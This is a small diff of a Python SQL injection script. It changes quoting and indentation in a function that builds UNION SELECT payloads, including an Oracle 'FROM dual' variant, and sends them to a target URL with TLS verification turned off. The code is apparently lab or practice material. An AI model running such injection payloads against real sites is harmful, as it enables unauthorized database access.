@@ -41,8 +41,8 @@ def exploit_sqli_column_text(base_url, num_of_col):
         variation[i] = payload
         str_variation = ", ".join(variation)
         py = f" UNION select {str_variation}--"
-        if DB == 'ORACLE':
-             py = f" UNION select {str_variation} FROM dual--"
+        if DB == "ORACLE":
+            py = f" UNION select {str_variation} FROM dual--"
         # print(base_url + uri + py)
         r = requests.get(base_url + uri + py, proxies=proxies, verify=False, timeout=5)
         if r.status_code != 200:
